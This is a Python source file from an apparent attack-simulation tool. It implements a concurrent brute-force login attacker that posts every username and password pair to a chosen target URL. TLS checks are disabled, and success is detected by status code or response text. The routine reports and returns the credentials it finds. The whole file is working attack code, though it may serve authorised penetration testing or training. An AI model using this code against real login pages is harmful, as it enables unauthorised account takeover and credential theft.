# attack-simulation/app/simulations/brute_force_simulation.py

from app.simulations.simulation_params import BruteForceParams
from typing import Dict, Any, List, Callable, Coroutine
import httpx
import asyncio

async def run_bruteforce_simulation(
    params: BruteForceParams, 
    progress_callback: Callable[[Dict[str, Any]], Coroutine[Any, Any, None]]
) -> Dict[str, Any]:
    print(f"Starting Brute Force Simulation: Target={params.target_url}")
    credentials_found: List[Dict[str, str]] = []
    total_attempts_made = 0
    total_possible_attempts = len(params.usernames) * len(params.passwords)
    simulation_halted = False

    await progress_callback({
        "type": "progress", "message": "Starting brute force attack...", 
        "completed": 0, "total": total_possible_attempts
    })

    async def try_single_login(session: httpx.AsyncClient, username: str, password: str) -> bool:
        nonlocal total_attempts_made
        login_payload = {params.username_field: username, params.password_field: password}
        try:
            response = await session.post(str(params.target_url), data=login_payload, timeout=15.0, follow_redirects=True)
            success = False
            if params.success_status_code and response.status_code == params.success_status_code:
                success = True
            if not success and params.success_text_indicator and params.success_text_indicator.lower() in response.text.lower():
                success = True
            if success:
                print(f"Successful Login! User: {username}, Password: {password}")
                credentials_found.append({"username": username, "password": password})
                await progress_callback({
                    "type": "progress", "message": f"SUCCESS! Found credentials for {username}!",
                    "found": True, "credentials": {"username": username, "password": password}
                })
                return True
        except httpx.RequestError:
            pass
        finally:
            total_attempts_made += 1
            if total_attempts_made % 10 == 0: # Her 10 denemede bir güncelleme gönder
                 await progress_callback({
                    "type": "progress", "message": f"Attempt {total_attempts_made}/{total_possible_attempts}...",
                    "completed": total_attempts_made, "total": total_possible_attempts
                })
        return False

    semaphore = asyncio.Semaphore(params.concurrency)
    async def worker(session: httpx.AsyncClient, username: str, password: str) -> bool:
        async with semaphore:
            return await try_single_login(session, username, password)

    async with httpx.AsyncClient(verify=False) as client:
        for username in params.usernames:
            if simulation_halted: break
            await progress_callback({
                "type": "progress", "message": f"Trying passwords for user '{username}'...",
                "completed": total_attempts_made, "total": total_possible_attempts
            })
            password_tasks = [worker(client, username, password) for password in params.passwords]
            results = await asyncio.gather(*password_tasks)
            if any(res for res in results if isinstance(res, bool) and res):
                if params.stop_on_first_success:
                    print(f"Password found, halting simulation.")
                    simulation_halted = True
                    break

    await progress_callback({"type": "final_summary", "message": "Brute force simulation completed."})

    result = {
        "target_url": str(params.target_url),
        "total_attempts_made": total_attempts_made,
        "credentials_found": credentials_found,
        "simulation_halted_early": simulation_halted and bool(credentials_found)
    }
    print(f"Brute Force Simulation Completed: {result}")
    return result